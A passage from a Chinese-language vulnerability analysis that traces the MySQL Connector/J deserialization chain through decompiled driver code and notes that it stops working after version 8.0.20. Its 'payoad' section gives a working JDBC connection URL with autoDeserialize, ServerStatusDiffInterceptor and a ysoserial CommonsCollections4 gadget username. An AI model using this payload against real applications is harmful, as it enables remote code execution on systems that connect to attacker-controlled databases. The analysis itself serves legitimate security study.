调用至com.mysql.cj.jdbc.ConnectionImpl#setAutoCommit()

`public void setAutoCommit(final boolean autoCommitFlag) throws SQLException {
    try {
        synchronized(this.getConnectionMutex()) {
            this.checkClosed();
            if (this.connectionLifecycleInterceptors != null) {
                IterateBlock<ConnectionLifecycleInterceptor> iter = new IterateBlock<ConnectionLifecycleInterceptor>(this.connectionLifecycleInterceptors.iterator()) {
                    void forEach(ConnectionLifecycleInterceptor each) throws SQLException {
                        if (!each.setAutoCommit(autoCommitFlag)) {
                            this.stopIterating = true;
                        }

                    }
                };
                iter.doForAll();
                if (!iter.fullIteration()) {
                    return;
                }
            }

            if ((Boolean)this.autoReconnectForPools.getValue()) {
                this.autoReconnect.setValue(true);
            }

            try {
                boolean needsSetOnServer = true;
                if ((Boolean)this.useLocalSessionState.getValue() && this.session.isAutoCommit() == autoCommitFlag) {
                    needsSetOnServer = false;
                } else if (!(Boolean)this.autoReconnect.getValue()) {
                    needsSetOnServer = this.getSession().isSetNeededForAutoCommitMode(autoCommitFlag);
                }

                this.session.setAutoCommit(autoCommitFlag);
                if (needsSetOnServer) {

                    this.session.execSQL((Query)null, autoCommitFlag ? "SET autocommit=1" : "SET autocommit=0", -1, (PacketPayload)null, false, this.nullStatementResultSetFactory, this.database, (ColumnDefinition)null, false);
                }
            } finally {
                if ((Boolean)this.autoReconnectForPools.getValue()) {
                    this.autoReconnect.setValue(false);
                }

            }

        }
    } catch (CJException var12) {
        throw SQLExceptionsMapping.translateException(var12, this.getExceptionInterceptor());
    }
}` 

调用至com.mysql.cj.mysqla.MysqlaSession()#execSQL()

`public <T extends Resultset> T execSQL(Query callingQuery, String query, int maxRows, PacketPayload packet, boolean streamResults, ProtocolEntityFactory<T> resultSetFactory, String catalog, ColumnDefinition cachedMetadata, boolean isBatch) {
    long queryStartTime = 0L;
    int endOfQueryPacketPosition = 0;
    if (packet != null) {
        endOfQueryPacketPosition = packet.getPosition();
    }

    if ((Boolean)this.gatherPerfMetrics.getValue()) {
        queryStartTime = System.currentTimeMillis();
    }

    this.lastQueryFinishedTime = 0L;
    if ((Boolean)this.autoReconnect.getValue() && (this.autoCommit || (Boolean)this.autoReconnectForPools.getValue()) && this.needsPing && !isBatch) {
        try {
            this.ping(false, 0);
            this.needsPing = false;
        } catch (Exception var25) {
            this.invokeReconnectListeners();
        }
    }

    boolean var24 = false;

    Resultset var29;
    label198: {
        Resultset var30;
        try {
            var24 = true;
            if (packet != null) {
                var29 = this.protocol.sendQueryPacket(callingQuery, packet, maxRows, streamResults, catalog, cachedMetadata, this::getProfilerEventHandlerInstanceFunction, resultSetFactory);
                var24 = false;
                break label198;
            }

            String encoding = (String)this.characterEncoding.getValue();
            //调用至com.mysql.cj.mysqla.io.MysqlaProtocol#sendQueryString()
            var30 = this.protocol.sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata, this::getProfilerEventHandlerInstanceFunction, resultSetFactory);
            var24 = false;
    ...` 

调用至com.mysql.cj.mysqla.io.MysqlaProtocol#sendQueryString()

 `public final <T extends Resultset> T sendQueryString(Query callingQuery, String query, String characterEncoding, int maxRows, boolean streamResults, String catalog, ColumnDefinition cachedMetadata, Protocol.GetProfilerEventHandlerInstanceFunction getProfilerEventHandlerInstanceFunction, ProtocolEntityFactory<T> resultSetFactory) throws IOException {
        ...
        return this.sendQueryPacket(callingQuery, sendPacket, maxRows, streamResults, catalog, cachedMetadata, getProfilerEventHandlerInstanceFunction, resultSetFactory);
    }` 

调用至com.mysql.cj.mysqla.io.MysqlaProtocol#sendQueryPacke()

`public final <T extends Resultset> T sendQueryPacket(Query callingQuery, PacketPayload queryPacket, int maxRows, boolean streamResults, String catalog, ColumnDefinition cachedMetadata, Protocol.GetProfilerEventHandlerInstanceFunction getProfilerEventHandlerInstanceFunction, ProtocolEntityFactory<T> resultSetFactory) throws IOException {
    ++this.statementExecutionDepth;
    byte[] queryBuf = null;
    int oldPacketPosition = false;
    long queryStartTime = 0L;
    long queryEndTime = 0L;
    byte[] queryBuf = queryPacket.getByteBuffer();
    int oldPacketPosition = queryPacket.getPosition();
    queryStartTime = this.getCurrentTimeNanosOrMillis();
    String query = StringUtils.toString(queryBuf, 1, oldPacketPosition - 1);

    try {
        Resultset testcaseQuery;
        if (this.queryInterceptors != null) {
            //
            testcaseQuery = this.invokeQueryInterceptorsPre(query, callingQuery, false);
            if (testcaseQuery != null) {
                Resultset var42 = testcaseQuery;
                return var42;
            }
        }
        ...` 

调用至com.mysql.cj.mysqla.io.MysqlaProtocol#invokeQueryInterceptorsPre()

`public <T extends Resultset> T invokeQueryInterceptorsPre(String sql, Query interceptedQuery, boolean forceExecute) {
    T previousResultSet = null;
    int i = 0;

    for(int s = this.queryInterceptors.size(); i < s; ++i) {
        QueryInterceptor interceptor = (QueryInterceptor)this.queryInterceptors.get(i);
        boolean executeTopLevelOnly = interceptor.executeTopLevelOnly();
        boolean shouldExecute = executeTopLevelOnly && (this.statementExecutionDepth == 1 || forceExecute) || !executeTopLevelOnly;
        if (shouldExecute) {
            T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);
            if (interceptedResultSet != null) {
                previousResultSet = interceptedResultSet;
            }
        }
    }

    return previousResultSet;
}` 

调用至com.mysql.cj.jdbc.interceptors.NoSubInterceptorWrapper#preProcess()

`public <T extends Resultset> T preProcess(String sql, Query interceptedQuery) {
    this.underlyingInterceptor.preProcess(sql, interceptedQuery);
    return null;
}` 

调用至com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#preProcess()

`public <T extends Resultset> T preProcess(String sql, Query interceptedQuery) {
    this.populateMapWithSessionStatusValues(this.preExecuteValues);
    return null;
}` 

调用com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()

`private void populateMapWithSessionStatusValues(Map<String, String> toPopulate) {
    Statement stmt = null;
    ResultSet rs = null;

    try {
        try {
            toPopulate.clear();
            stmt = this.connection.createStatement();
            rs = stmt.executeQuery("SHOW SESSION STATUS");
            ResultSetUtil.resultSetToMap(toPopulate, rs);
        } finally {
            if (rs != null) {
                rs.close();
            }

            if (stmt != null) {
                stmt.close();
            }

        }

    } catch (SQLException var8) {
        throw ExceptionFactory.createException(var8.getMessage(), var8);
    }
}` 

调用至com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap(),

`public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
    while(rs.next()) {
        mappedValues.put(rs.getObject(1), rs.getObject(2));
    }

}` 

调用至getObject()方法，最后进行反序列化。

#### [payoad](#toc_payoad)

`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/27ccf404-9b1d-436f-a680-1ffa383c8677.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/c09fcc78-14f9-4121-9567-e95cccfd692e.png)

### [8.0.20之后](#toc_8020)

com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues不再调用resultSetToMap()即getObject()。此利用链失效

`private void populateMapWithSessionStatusValues(Map<String, String> toPopulate) {
    try {
        Statement stmt = this.connection.createStatement();
        Throwable var3 = null;

        try {
            toPopulate.clear();
            ResultSet rs = stmt.executeQuery("SHOW SESSION STATUS");
            Throwable var5 = null;

            try {
                while(rs.next()) {
                    toPopulate.put(rs.getString(1), rs.getString(2));
                }
            } catch (Throwable var30) {
                var5 = var30;
                throw var30;
            } finally {
                if (rs != null) {
                    if (var5 != null) {
                        try {
                            rs.close();
                        } catch (Throwable var29) {
                            var5.addSuppressed(var29);
                        }
                    } else {
                        rs.close();
                    }
                }

            }
        } catch (Throwable var32) {
            var3 = var32;
            throw var32;
        } finally {
            if (stmt != null) {
                if (var3 != null) {
                    try {
                        stmt.close();
                    } catch (Throwable var28) {
                        var3.addSuppressed(var28);
                    }
                } else {
                    stmt.close();
                }
            }

        }

    } catch (SQLException var34) {
        throw ExceptionFactory.createException(var34.getMessage(), var34);
    }
}`